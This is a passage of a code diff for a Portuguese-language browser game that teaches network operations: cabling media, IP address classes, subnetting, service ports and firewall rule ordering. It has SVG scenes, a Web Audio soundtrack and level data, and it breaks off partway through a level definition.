+  for (let i = 0; i < n; i++) s += `<rect x="${x + 2}" y="${y + 2 + i * 4}" width="${((w - 4) * (0.3 + ((i * 37) % 60) / 100)).toFixed(1)}" height="1.5" fill="${i % 5 === 3 ? '#ffd166' : c}" opacity="${(0.5 + ((i * 13) % 5) / 10).toFixed(1)}"/>`;
+  return s + '</g></g>';
+}
+function bgS() {
+  let s = `<defs><linearGradient id="wg" x1="0" y1="0" x2="0" y2="1"><stop offset="0" stop-color="#0a1426"/><stop offset="1" stop-color="#101f38"/></linearGradient></defs>
+  <rect width="400" height="120" fill="url(#wg)"/>
+  <rect x="0" y="14" width="400" height="3" fill="#15223a"/>
+  <rect class="lamp" x="40" y="0" width="70" height="4" fill="#9fe8d5"/><rect class="lamp" x="190" y="0" width="70" height="4" fill="#9fe8d5" style="animation-delay:1.3s"/>
+  <text x="128" y="42" font-family="Orbitron,monospace" font-size="11" font-weight="800" fill="#00e0a8" opacity=".35" letter-spacing="3">NOC</text>
+  <rect x="0" y="104" width="400" height="16" fill="#0a1120"/><path d="M0 104H400" stroke="#1e2d48"/>`;
+  for (let x = 0; x <= 400; x += 40) s += `<path d="M${x} 104L${x * 1.08 - 16} 120" stroke="#15223a"/>`;
+  [12, 58].forEach((x, k) => {
+    s += `<rect x="${x}" y="36" width="40" height="68" rx="2" fill="#0d182b" stroke="#182640"/>`;
+    for (let i = 0; i < 6; i++) s += `<rect x="${x + 4}" y="${40 + i * 10.5}" width="32" height="7" fill="#0a1322"/>` + led(x + 8, 43.5 + i * 10.5, i % 2 ? '#00e0a8' : '#4dd2ff', (i * .3 + k) % 1.3);
+  });
+  return s;
+}
+function rackS(x, loose) {
+  let s = `<rect x="${x}" y="22" width="66" height="84" rx="3" fill="#121d31" stroke="#2c3d5c"/><rect x="${x + 3}" y="25" width="60" height="78" fill="#0c1628"/>`;
+  for (let i = 0; i < 7; i++) {
+    const y = 28 + i * 10.8;
+    s += `<rect x="${x + 6}" y="${y}" width="54" height="8.5" rx="1" fill="#16233a" stroke="#223350" stroke-width=".5"/>`;
+    for (let j = 0; j < 4; j++) s += led(x + 10 + j * 4, y + 4.2, (i + j) % 3 ? '#00e0a8' : '#4dd2ff', ((i * 4 + j) * .17) % 1.3);
+    for (let j = 0; j < 5; j++) s += `<rect x="${x + 30 + j * 5.5}" y="${y + 2.2}" width="4" height="4" fill="#070d18"/>`;
+  }
+  ['#ffd400', '#33d6c9', '#3d8bff', '#7ee06a', '#a6b1c6'].forEach((c, k) => {
+    const sx = x + 32 + k * 5.5, sy = 32 + k * 12;
+    s += loose
+      ? `<path d="M${sx} ${sy} C${sx - 4} ${sy + 34} ${x - 14 + k * 9} 96 ${x - 26 + k * 11} 104" stroke="${c}" stroke-width="1.6" fill="none"/><rect x="${x - 29 + k * 11}" y="101" width="5" height="3" fill="${c}"/>`
+      : `<path d="M${sx} ${sy} C${sx + 12} ${sy + 18} ${x + 72} ${sy + 24} ${x + 70} ${sy + 44}" stroke="${c}" stroke-width="1.4" fill="none"/>`;
+  });
+  return s;
+}
+function deskS(x, id) {
+  return `<rect x="${x}" y="82" width="100" height="4" rx="1" fill="#2a3b58"/><rect x="${x + 6}" y="86" width="3" height="18" fill="#1b2840"/><rect x="${x + 91}" y="86" width="3" height="18" fill="#1b2840"/>
+  <rect x="${x + 22}" y="46" width="60" height="34" rx="2" fill="#050a12" stroke="#3a4d6e"/>${lines(id, x + 24, 48, 56, 30, '#00e0a8')}
+  <rect x="${x + 49}" y="80" width="6" height="2" fill="#3a4d6e"/><rect x="${x + 26}" y="79" width="32" height="3" rx="1" fill="#34476a"/>
+  <rect x="${x + 84}" y="74" width="6" height="8" rx="1" fill="#ff7a45"/><path d="M${x + 90} 76 q3 2 0 4" stroke="#ff7a45" fill="none"/>`;
+}
+function fwS(x, id) {
+  let s = `<rect x="${x}" y="80" width="40" height="3" fill="#2a3b58"/><rect x="${x + 18}" y="83" width="4" height="20" fill="#1b2840"/><rect x="${x + 8}" y="102" width="24" height="2" fill="#1b2840"/>
+  <rect x="${x + 6}" y="58" width="30" height="20" rx="1.5" fill="#050a12" stroke="#3a4d6e"/>${lines(id, x + 7, 59, 28, 18, '#ffb020')}<rect x="${x + 3}" y="78" width="36" height="2" rx="1" fill="#3a4d6e"/>
+  <rect x="${x + 58}" y="26" width="64" height="80" rx="3" fill="#121d31" stroke="#2c3d5c"/>
+  <rect x="${x + 62}" y="34" width="56" height="20" rx="1.5" fill="#2a1410" stroke="#ff7a45"/>`;
+  for (let r = 0; r < 3; r++) for (let c = 0; c < 4; c++) s += `<rect x="${x + 64 + c * 7 + (r % 2 ? 3.5 : 0)}" y="${36 + r * 5.5}" width="6" height="4.5" fill="#ff7a45" opacity=".75"/>`;
+  s += `<text x="${x + 100}" y="47" font-family="Orbitron,monospace" font-size="7" font-weight="800" fill="#ffb020">FW</text>`;
+  for (let i = 0; i < 4; i++) { const y = 60 + i * 10.5; s += `<rect x="${x + 62}" y="${y}" width="56" height="8" fill="#16233a"/>` + led(x + 66, y + 4, '#ffb020', i * .3) + led(x + 70, y + 4, '#00e0a8', i * .2 + .4); }
+  s += `<path d="M${x + 36} 70 C${x + 48} 72 ${x + 52} 50 ${x + 62} 48" stroke="#4dd2ff" stroke-width="1.2" fill="none" stroke-dasharray="2 2"/>`;
+  return s;
+}
+function warS(boss, id) {
+  let s = `<rect class="scrframe" x="200" y="20" width="190" height="62" rx="3" fill="${boss ? '#1a0610' : '#050a12'}" stroke="${boss ? '#ff2e63' : '#2c3d5c'}" stroke-width="1.5"/>`;
+  if (boss) {
+    s += `<g class="glitch"><path d="M318 82 C318 50 330 30 350 28 C370 30 382 50 382 82Z" fill="#12050a"/><ellipse cx="350" cy="52" rx="14" ry="18" fill="#e8e8ee"/><path d="M338 46l9 3.5-9 3.5z" fill="#ff2e63"/><path d="M362 46l-9 3.5 9 3.5z" fill="#ff2e63"/><path d="M344 62q6 4 12 0" stroke="#1a0610" stroke-width="2" fill="none"/>
+    <text x="210" y="34" font-family="Orbitron,monospace" font-size="9" font-weight="800" fill="#ff2e63" class="led">Z3R0</text><text x="208" y="44" font-family="JetBrains Mono,monospace" font-size="6" fill="#ff2e63">pwned.exe</text></g>
+    <g class="zdef"><rect x="201" y="21" width="188" height="60" rx="2" fill="#04150f"/><text x="208" y="34" font-family="Orbitron,monospace" font-size="7" font-weight="800" fill="#00e0a8">THREAT NEUTRALIZED</text>
+    <text x="345" y="46" text-anchor="middle" font-family="Orbitron,monospace" font-size="9" font-weight="800" fill="#00e0a8">Z3R0 OFFLINE</text>
+    <text x="345" y="58" text-anchor="middle" font-family="JetBrains Mono,monospace" font-size="5.5" fill="#9fe8d5">C2 em blackhole</text>
+    <text x="345" y="67" text-anchor="middle" font-family="JetBrains Mono,monospace" font-size="5.5" fill="#9fe8d5">65535:666</text></g>`;
+  } else {
+    let p = '', q = '';
+    for (let i = 0; i <= 18; i++) { p += `${206 + i * 10},${70 - (12 + ((i * 7) % 11) + (i > 11 ? 20 + (i % 3) * 6 : 0))} `; q += `${206 + i * 10},${72 - (6 + ((i * 5) % 7))} `; }
+    s += `<polyline class="graph" points="${p}" fill="none" stroke="#ff4d6d" stroke-width="1.6"/><polyline points="${q}" fill="none" stroke="#00e0a8" stroke-width="1.2"/>
+    <text x="208" y="31" font-family="Orbitron,monospace" font-size="7" font-weight="800" fill="#ff4d6d" class="led">DDoS 80 Gbps</text>`;
+  }
+  s += deskS(215, id);
+  return s;
+}
+function srvS(x, id) {
+  let s = `<rect x="${x}" y="80" width="40" height="3" fill="#2a3b58"/><rect x="${x + 18}" y="83" width="4" height="20" fill="#1b2840"/><rect x="${x + 8}" y="102" width="24" height="2" fill="#1b2840"/>
+  <rect x="${x + 6}" y="58" width="30" height="20" rx="1.5" fill="#050a12" stroke="#3a4d6e"/>${lines(id, x + 7, 59, 28, 18, '#ff7ad9')}<rect x="${x + 3}" y="78" width="36" height="2" rx="1" fill="#3a4d6e"/>
+  <rect x="${x + 58}" y="24" width="64" height="82" rx="3" fill="#121d31" stroke="#2c3d5c"/>`;
+  for (let i = 0; i < 7; i++) { const y = 29 + i * 10.8; s += `<rect x="${x + 62}" y="${y}" width="56" height="8.5" fill="#16233a"/>` + led(x + 66, y + 4.2, i === 3 ? '#ff2e63' : '#00e0a8', i * .2, i === 3 ? 'redled' : 'led') + `<rect x="${x + 74}" y="${y + 3}" width="30" height="2.5" fill="#0a1322"/>`; }
+  s += `<path d="M${x + 110} 8 l7 12 h-14z" fill="#ff2e63" class="redled"/><text x="${x + 108.6}" y="18.5" font-size="8" font-weight="800" fill="#1a0610">!</text>`;
+  return s;
+}
+const HX = { rack: 272, desk: 252, firewall: 252, war: 206, server: 252 };
+const LOCNAME = { rack: 'RACK · DATACENTER', desk: 'TERMINAL DO NOC', firewall: 'CONSOLE DO FIREWALL', war: 'SALA DE GUERRA', server: 'SERVIDOR COMPROMETIDO' };
+function sceneSVG(loc, boss, loose) {
+  let s = `<svg viewBox="0 0 400 120" preserveAspectRatio="xMaxYMax slice">` + bgS();
+  if (loc === 'rack') s += rackS(300, loose);
+  if (loc === 'desk') s += deskS(262, 'sc1');
+  if (loc === 'firewall') s += fwS(262, 'sc1');
+  if (loc === 'war') s += warS(boss, 'sc1');
+  if (loc === 'server') s += srvS(262, 'sc1');
+  return s + HERO + '</svg>';
+}
+function heroTo(sc, x, instant) {
+  const h = sc.querySelector('.hero');
+  if (instant) { h.style.transition = 'none'; h.style.transform = `translate(${x}px,106px)`; h.getBoundingClientRect(); h.style.transition = ''; }
+  else h.style.transform = `translate(${x}px,106px)`;
+}
+function heroState(cls, ms) {
+  const h = $('scene').querySelector('.hero'); if (!h) return;
+  h.classList.remove('hit', 'happy'); void h.getBBox;
+  h.classList.add(cls);
+  setTimeout(() => h.classList.remove(cls), ms || 500);
+}
+function sceneFx(cls, ms) {
+  const sc = $('scene'); sc.classList.remove('alarm', 'okf'); void sc.offsetWidth; sc.classList.add(cls);
+  clearTimeout(sceneFx.t); sceneFx.t = setTimeout(() => sc.classList.remove(cls), ms);
+}
+
+// title scene
+$('tScene').innerHTML = sceneSVG('war', true) + `<div class="caption"><i></i>03:12 · ALERTA CRÍTICO NO NOC</div>`;
+heroTo($('tScene'), HX.war, true); $('tScene').querySelector('.hero').classList.add('type');
+
+// ---------- audio ----------
+let AC = null, MASTER, MUSG, SFXG, DLY, muted = false;
+try { muted = localStorage.getItem('noc_mute') === '1'; } catch (e) {}
+function au() {
+  if (!AC) {
+    try {
+      AC = new (window.AudioContext || window.webkitAudioContext)();
+      const comp = AC.createDynamicsCompressor(); comp.threshold.value = -14; comp.ratio.value = 4;
+      MASTER = AC.createGain(); MASTER.gain.value = muted ? 0 : 0.9;
+      MASTER.connect(comp); comp.connect(AC.destination);
+      MUSG = AC.createGain(); MUSG.gain.value = 0.32; MUSG.connect(MASTER);
+      SFXG = AC.createGain(); SFXG.gain.value = 1; SFXG.connect(MASTER);
+      DLY = AC.createDelay(); DLY.delayTime.value = 0.19;
+      const fb = AC.createGain(); fb.gain.value = 0.32; const wet = AC.createGain(); wet.gain.value = 0.3;
+      DLY.connect(fb); fb.connect(DLY); DLY.connect(wet); wet.connect(MASTER);
+    } catch (e) { AC = null; }
+  } else if (AC.state === 'suspended') AC.resume();
+}
+const mtof = m => 440 * Math.pow(2, (m - 69) / 12);
+function osc(f, d, { type = 'square', v = .05, sl = 0, at = 0, bus, echo = false, det = 0, att = .005 } = {}) {
+  if (!AC) return;
+  const t = (at || AC.currentTime), o = AC.createOscillator(), g = AC.createGain();
+  o.type = type; o.frequency.setValueAtTime(f, t); if (det) o.detune.value = det;
+  if (sl) o.frequency.exponentialRampToValueAtTime(Math.max(30, f + sl), t + d);
+  g.gain.setValueAtTime(0.0001, t); g.gain.linearRampToValueAtTime(v, t + att); g.gain.exponentialRampToValueAtTime(.0001, t + d);
+  o.connect(g); g.connect(bus || SFXG); if (echo) g.connect(DLY);
+  o.start(t); o.stop(t + d + .05);
+}
+let NB = null;
+function noiseBuf() { if (!NB) { const len = AC.sampleRate * 3; NB = AC.createBuffer(1, len, AC.sampleRate); const d = NB.getChannelData(0); for (let i = 0; i < len; i++) d[i] = Math.random() * 2 - 1; } return NB; }
+function noise(d, { v = .1, type = 'highpass', f = 6000, f2 = 0, at = 0, bus, q = 1 } = {}) {
+  if (!AC) return;
+  const t = at || AC.currentTime, s = AC.createBufferSource(), fl = AC.createBiquadFilter(), g = AC.createGain();
+  s.buffer = noiseBuf(); fl.type = type; fl.frequency.setValueAtTime(f, t); fl.Q.value = q;
+  if (f2) fl.frequency.exponentialRampToValueAtTime(f2, t + d);
+  g.gain.setValueAtTime(v, t); g.gain.exponentialRampToValueAtTime(.0001, t + d);
+  s.connect(fl); fl.connect(g); g.connect(bus || SFXG); s.start(t, Math.random() * .8); s.stop(t + d + .05);
+}
+function kick(at, v = .5, bus) { if (!AC) return; const o = AC.createOscillator(), g = AC.createGain(); o.frequency.setValueAtTime(150, at); o.frequency.exponentialRampToValueAtTime(40, at + .12); g.gain.setValueAtTime(v, at); g.gain.exponentialRampToValueAtTime(.0001, at + .25); o.connect(g); g.connect(bus || MUSG); o.start(at); o.stop(at + .3); }
+const sfx = {
+  ok(c) { const b = 72 + Math.min(c, 5) * 2; const t = AC && AC.currentTime; if (!AC) return; [0, 4, 7].forEach((n, i) => { osc(mtof(b + n), .35, { type: 'sine', v: .09, at: t + i * .045, echo: true }); osc(mtof(b + n + 12), .2, { type: 'triangle', v: .03, at: t + i * .045 }); }); },
+  plug() { if (!AC) return; const t = AC.currentTime; noise(.03, { v: .25, f: 3000, at: t }); osc(90, .08, { type: 'square', v: .06, at: t }); [76, 83, 88].forEach((m, i) => osc(mtof(m), .18, { type: 'sine', v: .07, at: t + .06 + i * .06, echo: true })); },
+  bad() { if (!AC) return; const t = AC.currentTime; osc(140, .28, { type: 'sawtooth', v: .09, sl: -80, at: t }); osc(147, .28, { type: 'square', v: .05, sl: -90, at: t }); noise(.2, { v: .14, type: 'bandpass', f: 1200, q: 3, at: t }); for (let i = 0; i < 4; i++) osc(200 + Math.random() * 600, .03, { type: 'square', v: .04, at: t + .05 + i * .04 }); },
+  step() { if (!AC) return; noise(.05, { v: .18, type: 'lowpass', f: 400 }); osc(70, .06, { type: 'sine', v: .12 }); },
+  key() { if (!AC) return; noise(.018, { v: .12, f: 4000 + Math.random() * 2000 }); },
+  sel() { osc(1320, .06, { type: 'sine', v: .05 }); osc(1760, .05, { type: 'sine', v: .03, at: AC && AC.currentTime + .03 }); },
+  whoosh() { noise(.45, { v: .12, type: 'bandpass', f: 300, f2: 3000, q: 1.5 }); },
+  tick() { osc(1500, .04, { type: 'square', v: .03 }); },
+  zap() { if (!AC) return; osc(1400, .25, { type: 'sawtooth', v: .07, sl: -1250 }); noise(.15, { v: .1, f: 2000 }); },
+  win() { if (!AC) return; const t = AC.currentTime; [60, 64, 67, 72, 76, 79].forEach((m, i) => { osc(mtof(m), .22, { type: 'square', v: .05, at: t + i * .09 }); osc(mtof(m), .22, { type: 'triangle', v: .06, at: t + i * .09, echo: true }); }); [72, 76, 79, 84].forEach(m => osc(mtof(m), 1.1, { type: 'triangle', v: .06, at: t + .6, echo: true })); kick(t + .6, .5, SFXG); },
+  lose() { if (!AC) return; const t = AC.currentTime; [64, 61, 57, 52].forEach((m, i) => { osc(mtof(m), .4, { type: 'sawtooth', v: .06, at: t + i * .2, det: -15 }); osc(mtof(m), .4, { type: 'sawtooth', v: .06, at: t + i * .2, det: 15 }); }); noise(1, { v: .1, type: 'lowpass', f: 2000, f2: 100, at: t + .8 }); },
+  boom() { if (!AC) return; const t = AC.currentTime; noise(1.6, { v: .45, type: 'lowpass', f: 3000, f2: 60, at: t }); osc(80, 1.2, { type: 'sine', v: .4, sl: -50, at: t }); [0, .15, .3].forEach(d => osc(900 - d * 1000, .3, { type: 'sawtooth', v: .05, sl: -700, at: t + d })); },
+  siren() { if (!AC) return; const t = AC.currentTime, o = AC.createOscillator(), g = AC.createGain(); o.type = 'sawtooth'; o.frequency.setValueAtTime(600, t); o.frequency.linearRampToValueAtTime(950, t + .35); o.frequency.linearRampToValueAtTime(600, t + .7); g.gain.setValueAtTime(.04, t); g.gain.exponentialRampToValueAtTime(.0001, t + .75); o.connect(g); g.connect(SFXG); o.start(t); o.stop(t + .8); }
+};
+
+// ---------- music (sequencer) ----------
+const SONGS = {
+  menu: { bpm: 96, prog: [[45, 0], [41, 1], [48, 1], [43, 1]], lead: false, hat: 2, snare: false },
+  play: { bpm: 116, prog: [[45, 0], [41, 1], [43, 1], [40, 0]], lead: false, hat: 1, snare: true },
+  boss: { bpm: 144, prog: [[38, 0], [46, 1], [43, 0], [45, 1]], lead: true, hat: 1, snare: true }
+};
+const LEADB = [0, null, 7, null, 12, 10, 7, null, 3, null, 5, 7, null, 3, 2, null];
+const MUS = { cur: null, step: 0, next: 0, timer: null };
+function music(name) {
+  if (MUS.cur === name && MUS.timer) return;
+  MUS.cur = name;
+  if (!AC || muted) return;
+  if (!MUS.timer) { MUS.next = AC.currentTime + .08; MUS.step = 0; MUS.timer = setInterval(schedule, 25); }
+}
+function stopMusic() { clearInterval(MUS.timer); MUS.timer = null; }
+function schedule() {
+  const sg = SONGS[MUS.cur]; if (!sg || !AC) return;
+  const sd = 60 / sg.bpm / 4;
+  while (MUS.next < AC.currentTime + .15) {
+    const s = MUS.step, t = MUS.next, bar = (s >> 4) % 4, st = s % 16, ch = sg.prog[bar], root = ch[0], third = ch[1] ? 4 : 3;
+    if (st % 4 === 0) kick(t, MUS.cur === 'boss' ? .55 : .4);
+    if (sg.snare && (st === 4 || st === 12)) noise(.14, { v: .16, type: 'bandpass', f: 1800, q: .8, at: t, bus: MUSG });
+    if (st % sg.hat === 0 && st % 4 !== 0) noise(.04, { v: st % 2 ? .05 : .08, f: 8000, at: t, bus: MUSG });
+    if (st % 2 === 0) osc(mtof(root + (st % 8 === 6 ? 12 : 0)), sd * 1.8, { type: 'sawtooth', v: .1, at: t, bus: MUSG, det: MUS.cur === 'boss' ? 8 : 0 });
+    const arp = [0, third, 7, 12][st % 4] + 24 + (st >= 8 ? 12 : 0);
+    osc(mtof(root + arp), sd * .9, { type: 'triangle', v: .05, at: t, bus: MUSG, echo: true });
+    if (sg.lead && LEADB[st] !== null && bar % 2 === 1) osc(mtof(root + 24 + LEADB[st]), sd * 1.6, { type: 'square', v: .035, at: t, bus: MUSG, echo: true });
+    if (st === 0) osc(mtof(root + 12 + third), sd * 15, { type: 'sine', v: .04, at: t, bus: MUSG, att: .3 });
+    MUS.next += sd; MUS.step = (MUS.step + 1) % 64;
+  }
+}
+function setMute(m) {
+  muted = m; try { localStorage.setItem('noc_mute', m ? '1' : '0'); } catch (e) {}
+  if (MASTER) MASTER.gain.setTargetAtTime(m ? 0 : .9, AC.currentTime, .05);
+  if (!m && AC && MUS.cur && !MUS.timer) { const c = MUS.cur; MUS.cur = null; music(c); }
+  if (m) stopMusic();
+  document.querySelectorAll('#sndT,#sndG').forEach(b => b.textContent = 'SOM: ' + (m ? 'OFF' : 'ON'));
+  document.querySelectorAll('#sndM').forEach(b => b.style.opacity = m ? .4 : 1);
+}
+const buzz = ms => { try { navigator.vibrate && navigator.vibrate(ms); } catch (e) {} };
+
+// ---------- fx ----------
+function burst(x, y, c, n = 12) {
+  const fx = $('fx');
+  for (let i = 0; i < n; i++) {
+    const p = document.createElement('div'); p.className = 'pt';
+    const a = Math.random() * Math.PI * 2, d = 30 + Math.random() * 40;
+    p.style.cssText = `left:${x}px;top:${y}px;background:${c};--dx:${Math.cos(a) * d}px;--dy:${Math.sin(a) * d}px`;
+    fx.append(p); setTimeout(() => p.remove(), 700);
+  }
+}
+function floatTxt(x, y, t, c) {
+  const e = document.createElement('div'); e.className = 'ft'; e.textContent = t;
+  e.style.cssText = `left:${x}px;top:${y}px;color:${c}`;
+  $('fx').append(e); setTimeout(() => e.remove(), 1000);
+}
+const center = el => { const r = el.getBoundingClientRect(); return { x: r.left + r.width / 2, y: r.top + r.height / 2 }; };
+
+// ---------- media ----------
+const MEDIA = {
+  sm: { c: '#ffd400', n: 'Fibra monomodo OS2', ico: 'sfp' },
+  mm: { c: '#33d6c9', n: 'Fibra multimodo OM4', ico: 'sfp' },
+  dac: { c: '#a6b1c6', n: 'Cabo DAC twinax', ico: 'sfp' },
+  cu: { c: '#3d8bff', n: 'Cabo de rede Cat6', ico: 'rj45' },
+  pon: { c: '#7ee06a', n: 'Fibra GPON SC/APC', ico: 'sc' }
+};
+function icon(type, c) {
+  c = c || '#6b7c99';
+  if (type === 'sfp') return `<svg viewBox="0 0 30 19"><rect x="1" y="2" width="28" height="15" rx="2" fill="#0b1220" stroke="#6b7c99"/><rect x="5" y="5.5" width="9" height="8" rx="1" fill="#1d2b44"/><rect x="16" y="5.5" width="9" height="8" rx="1" fill="#1d2b44"/><rect x="1" y="2" width="3" height="15" fill="${c}"/></svg>`;
+  if (type === 'rj45') return `<svg viewBox="0 0 30 19"><rect x="5" y="1" width="20" height="17" rx="2" fill="#0b1220" stroke="#6b7c99"/><rect x="8.5" y="4" width="13" height="9" fill="#1d2b44"/><rect x="12" y="13" width="6" height="3" fill="#1d2b44"/><path d="M10 5.5h10" stroke="#d4b24a" stroke-width="1.6" stroke-dasharray="1 .8"/><rect x="5" y="1" width="3" height="17" fill="${c}"/></svg>`;
+  if (type === 'sc') return `<svg viewBox="0 0 30 19"><rect x="7" y="1" width="16" height="17" rx="2" fill="${c === '#6b7c99' ? '#3b5c36' : c}" stroke="#6b7c99"/><rect x="11" y="5" width="8" height="9" rx="1" fill="#0b1220"/><circle cx="15" cy="9.5" r="1.6" fill="#d7e3f5"/></svg>`;
+  return '';
+}
+
+// ---------- levels ----------
+const LEVELS = [
+{ act: 0, tag: 'CABEAMENTO', type: 'wire', title: 'Rack derrubado', legend: true,
+  goal: 'Arraste de cada porta da esquerda até o destino certo à direita. Cada cabo tem seu meio físico.',
+  z: 'Entrei no datacenter e arranquei todos os cabos do seu rack. Quero ver religar isso às 3 da manhã.',
+  me: 'Cada porta tem seu transceiver. É só ler o que está escrito nele.',
+  tip: 'LR = longa distância em fibra monomodo (amarela). SR = curta distância em multimodo (aqua). SFP28 no mesmo rack = DAC. RJ45 = cobre. PON da OLT vai para o splitter óptico.',
+  learn: 'Monomodo OS2 (amarela) atende LR/ER, quilômetros. Multimodo OM4 (aqua) atende SR, até uns 400 m em 10G. DAC é twinax de cobre com transceiver embutido, ideal até ~5 m. GPON usa SC/APC (verde) pelo polimento angular que reduz reflexão.',
+  left: [
+    { id: 'a', t: 'RT-BORDA xe-0/0/0', s: 'SFP+ 10GBASE-LR · POP a 8 km', m: 'sm' },
+    { id: 'b', t: 'PVE01 enp65s0f0', s: 'SFP28 25G · mesmo rack, 1 m', m: 'dac' },
+    { id: 'c', t: 'SW-ANDAR2 Te1/0/49', s: 'SFP+ 10GBASE-SR · 150 m', m: 'mm' },
+    { id: 'd', t: 'Estação NOC', s: 'Placa RJ45 1000BASE-T', m: 'cu' },
+    { id: 'e', t: 'OLT GPON 0/1/0', s: 'Módulo PON classe C+', m: 'pon' }
+  ],
+  right: [
+    { id: 'a', t: 'POP remoto', s: 'DIO com fibra monomodo OS2' },
+    { id: 'b', t: 'SW-TOR 25GE1/0/1', s: 'Gaiola SFP28 no mesmo rack' },
+    { id: 'c', t: 'SW-CORE 10GE1/0/12', s: 'SFP+ SR · fibra OM4' },
+    { id: 'd', t: 'SW-ACESSO Gi1/0/24', s: 'Patch panel Cat6' },
+    { id: 'e', t: 'Splitter 1:16', s: 'Adaptador SC/APC verde' }
+  ] },
+
+{ act: 0, tag: 'CLASSIFICAÇÃO', type: 'drop', mode: 'buckets', title: 'Quem é quem',
+  goal: 'Arraste cada IP para a categoria certa: privado, CGNAT ou público.',
+  intro: 'Os logs estão cheios de IPs. Separe o que é <b>interno</b>, o que é <b>CGNAT</b> e o que vem da <b>internet</b>.',
+  z: 'Enchi seus logs de IPs. Aposto que você nem sabe o que é interno e o que é da internet.',
+  me: 'RFC 1918 e RFC 6598 eu sei de cor.',
+  tip: 'Privado: 10.0.0.0/8, 172.16.0.0/12 (172.16 a 172.31), 192.168.0.0/16. CGNAT: 100.64.0.0/10 (100.64 a 100.127). O resto aqui é público.',
+  learn: 'Pegadinhas clássicas: 172.32.x.x já é público porque o /12 vai só até 172.31. 100.128.x.x é público porque o /10 do CGNAT termina em 100.127. 192.169.x.x também é público.',
+  buckets: [
+    { label: 'PRIVADO · RFC 1918', c: '#4dd2ff', a: ['10.20.30.40', '172.16.5.1', '192.168.100.254', '172.31.255.1'] },
+    { label: 'CGNAT · RFC 6598', c: '#ffd166', a: ['100.64.0.1', '100.100.50.5', '100.127.255.254'] },
+    { label: 'PÚBLICO', c: '#ff7ad9', a: ['8.8.8.8', '172.32.0.1', '100.128.0.1', '177.23.10.5', '192.169.1.1'] }
+  ] },
+
+{ act: 0, tag: 'SUB-REDES', type: 'drop', mode: 'slots', title: 'Dividir para conquistar',
+  goal: 'Divida 192.168.10.0/24 em 4 sub-redes iguais arrastando os valores certos.',
+  intro: 'Isole os segmentos: divida <b>192.168.10.0/24</b> em <b>4 sub-redes iguais</b>.',
+  z: 'Coloquei tudo numa /24 só. Um broadcast e eu chego em todo mundo.',
+  me: 'Então vou segmentar. 4 sub-redes, 2 bits emprestados.',
+  tip: '4 sub-redes = 2 bits a mais: /24 vira /26. Cada /26 tem 64 endereços (62 úteis). Os blocos andam de 64 em 64.',
+  learn: '/26 = 255.255.255.192, blocos de 64 endereços. Rede é o primeiro, broadcast é o último: .0-.63, .64-.127, .128-.191, .192-.255. Úteis = 2^6 - 2 = 62.',
+  html: `<div class="kv">Máscara<span class="grow"></span>[m]</div>
+<div class="kv">Hosts úteis por sub-rede<span class="grow"></span>[h]</div>
+<div class="grid3"><div class="h">SUB</div><div class="h">REDE 192.168.10.x</div><div class="h">BROADCAST</div>
+<div class="h">A</div>[a1][a2]<div class="h">B</div>[b1][b2]<div class="h">C</div>[c1][c2]<div class="h">D</div>[d1][d2]</div>`,
+  zones: { m: ['255.255.255.192'], h: ['62'], a1: ['.0'], a2: ['.63'], b1: ['.64'], b2: ['.127'], c1: ['.128'], c2: ['.191'], d1: ['.192'], d2: ['.255'] },
+  chips: ['255.255.255.192', '255.255.255.224', '255.255.255.128', '62', '64', '30', '.0', '.63', '.64', '.127', '.128', '.191', '.192', '.255', '.32', '.96', '.224'] },
+
+{ act: 0, tag: 'CONEXÃO', type: 'wire', title: 'Portas e serviços',
+  goal: 'Ligue cada serviço à sua porta padrão.',
+  z: 'Mudei todas as regras de porta. Você não vai saber o que liberar.',
+  me: 'Porta padrão é tatuagem de analista.',
+  tip: 'SSH 22, DNS 53, BGP 179, SNMP 161, HTTPS 443, RDP 3389.',
+  learn: 'BGP roda sobre TCP 179. SNMP usa UDP 161 (traps na 162). DNS usa UDP 53 e cai pra TCP 53 em respostas grandes e transferência de zona. RDP exposto na 3389 é um dos alvos favoritos de ransomware.',
+  left: [
+    { id: 'a', t: 'SSH', s: 'Acesso remoto seguro' },
+    { id: 'b', t: 'DNS', s: 'Resolução de nomes' },
+    { id: 'c', t: 'BGP', s: 'Roteamento entre AS' },
+    { id: 'd', t: 'SNMP', s: 'Monitoramento' },
+    { id: 'e', t: 'HTTPS', s: 'Web criptografada' },
+    { id: 'f', t: 'RDP', s: 'Área de trabalho remota' }
+  ],
+  right: [
+    { id: 'a', t: 'TCP 22', s: '' }, { id: 'b', t: 'UDP/TCP 53', s: '' }, { id: 'c', t: 'TCP 179', s: '' },
+    { id: 'd', t: 'UDP 161', s: '' }, { id: 'e', t: 'TCP 443', s: '' }, { id: 'f', t: 'TCP 3389', s: '' }
+  ] },
+
+{ act: 1, tag: 'TRIAGEM', type: 'drop', mode: 'buckets', title: 'Triagem de tráfego',
+  goal: 'Aplique a política: decida o que passa e o que é bloqueado.',
+  intro: 'Política do servidor web <b>10.0.0.10</b>: aceitar só <b>HTTPS</b> da internet. <b>SSH</b> só da gerência <b>10.99.0.0/24</b>. Todo o resto: bloquear.',
+  z: 'Estou mandando pacotes de todo lado. Qual deles é meu? Adivinha.',
+  me: 'Não preciso adivinhar. A política decide.',
+  tip: 'Confira destino, porta e, no caso do SSH, se a origem está dentro de 10.99.0.0/24 (10.99.0.0 a 10.99.0.255).',
+  learn: 'Firewall bom é política escrita antes de regra. Cuidado com vizinhos parecidos: 10.98.0.15 não está em 10.99.0.0/24, e HTTPS para 10.0.0.11 não é o servidor autorizado. Porta 80 também fica fechada se a política diz só HTTPS.',
+  buckets: [
+    { label: 'PERMITIR', c: '#00e0a8', a: ['203.0.113.7 → 10.0.0.10 TCP/443', '10.99.0.15 → 10.0.0.10 TCP/22', '192.0.2.44 → 10.0.0.10 TCP/443'] },
+    { label: 'BLOQUEAR', c: '#ff4d6d', a: ['203.0.113.7 → 10.0.0.10 TCP/22', '10.98.0.15 → 10.0.0.10 TCP/22', '198.51.100.9 → 10.0.0.10 TCP/80', '198.51.100.9 → 10.0.0.11 TCP/443', '10.99.0.200 → 10.0.0.10 TCP/3389'] }
+  ] },
+
+{ act: 1, tag: 'ORDENAÇÃO', type: 'drop', mode: 'slots', wide: true, title: 'Primeiro match',
+  goal: 'Coloque as regras na ordem certa. O firewall para na primeira que casar.',
+  intro: 'O firewall lê <b>de cima para baixo</b> e para no primeiro match. Objetivos: bloquear o atacante <b>45.67.89.10</b> em tudo, HTTPS público para <b>10.0.0.10</b>, SSH só da gerência <b>10.99.0.0/24</b> e negar o resto.',
+  z: 'Minhas regras estão no seu firewall, só embaralhei a ordem. Divirta-se.',
